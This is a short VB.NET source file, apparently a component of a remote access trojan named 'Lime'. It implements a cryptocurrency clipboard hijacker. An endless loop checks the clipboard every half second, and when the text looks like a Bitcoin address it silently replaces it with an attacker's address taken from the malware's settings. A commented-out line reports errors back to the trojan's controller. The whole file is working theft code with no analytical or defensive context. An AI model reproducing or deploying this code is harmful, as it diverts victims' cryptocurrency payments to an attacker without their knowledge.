Namespace Lime

    Public Class C_BTC
        Public Shared Sub _BTC_ST()
            While True
                Try
                    'the address always start with 1 or 3 or bc1
                    'the length is between 26-35 characters
                    'more info https://en.bitcoin.it/wiki/Address

                    If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 35 Then
                        If My.Computer.Clipboard.GetText.StartsWith("1") OrElse My.Computer.Clipboard.GetText.StartsWith("3") OrElse My.Computer.Clipboard.GetText.StartsWith("bc1") Then
                            Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf My.Computer.Clipboard.SetText)
                            _BTC.SetApartmentState(Threading.ApartmentState.STA)
                            _BTC.Start(C_Settings.BTC_ADDR)
                        End If
                    End If
                    Threading.Thread.Sleep(500)
                Catch ex As Exception
                    '  C_Main.C.Send("MSG" + C_Main.SPL + "BTC Error! " + ex.Message)
                End Try
            End While
        End Sub
    End Class
End Namespace
